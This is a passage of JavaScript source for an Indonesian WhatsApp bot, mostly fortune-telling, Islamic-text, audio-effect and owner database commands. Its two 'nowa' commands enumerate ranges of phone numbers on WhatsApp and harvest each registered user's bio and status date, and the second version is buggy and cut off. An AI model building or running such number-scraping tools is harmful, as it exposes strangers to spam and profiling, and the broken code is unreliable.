haikal.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)

if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)


if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'verify':{
if (isRegistered) return reply('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 if (isBan) throw sticBanLu(from)

xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break
//=================================================//

//=================================================//
case 'nowa': {
if (isBan) return sticBanLu(from)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break

//=================================================//

//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================// 

//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./baseikal/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: hw })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)

oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:hw}).catch ((err) => reply(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)

if (args[0] === 'pdf') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:hw})
} else if (args[0] === 'docx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:hw})
} else if (args[0] === 'pptx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:hw})
} else if (args[0] === 'xlsx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:hw})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)

if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'alquran': {
if (isBan) throw sticBanLu(from)

if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
haikal.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)

if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)

let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : hw })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//=================================================//
case 'setcmd': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
//=================================================//
case 'addmsg': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'getmsg': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
haikal.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'listmsg': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

let msgs = JSON.parse(fs.readFileSync('./baseikal/dbnye/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//

case 'public': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

haikal.public = true
reply('Sukses Change To Public')
}
break
//=================================================//
case 'self': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

haikal.public = false
reply('Sukses Change To Self')
}
break
//=================================================//
case 'nowa':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

var teks = body.slice(6)
if (!teks) return m.reply("lah?")
var numberPattern = /\d+/g;
var nomer = teks.match(numberPattern)
var random_length = teks.length - nomer[0].length;
if (random_length == 1) {
    var random = 10
} else if (random_length == 2) {
    var random = 100
} else if (random_length == 3) {
    var random = 1000
} else if (random_length == 4) {
    var random = 10000
}
console.log(random)
var nomerny = `List Nomer\n`
for (let i = 0; i < random; i++) {
    var nu = ['1','2','3','4','5','6','7','8','9']
    var dom1 = nu[Math.floor(Math.random() * nu.length)]
    var dom2 = nu[Math.floor(Math.random() * nu.length)]
    var dom3 = nu[Math.floor(Math.random() * nu.length)]
    var dom4 = nu[Math.floor(Math.random() * nu.length)]
    if (random_length == 1) {
var rndm = `${dom1}`
var gdaftar = []
    } else if (random_length == 2) {
rndm = `${dom1}${dom2}`
    } else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
    } else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
    }
    var anu = await haikal.getName(`${nomer[0]}${i}@s.whatsapp.net`);
    var bionye = await haikal.setStatus(`${nomer[0]}${i}@s.whatsapp.net`);
    var anuu = anu ? anu : false;
    try {
if (nomerny.includes(m.quoted.sender("@")[0])) {
//console.log(i)
} else {
nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
}
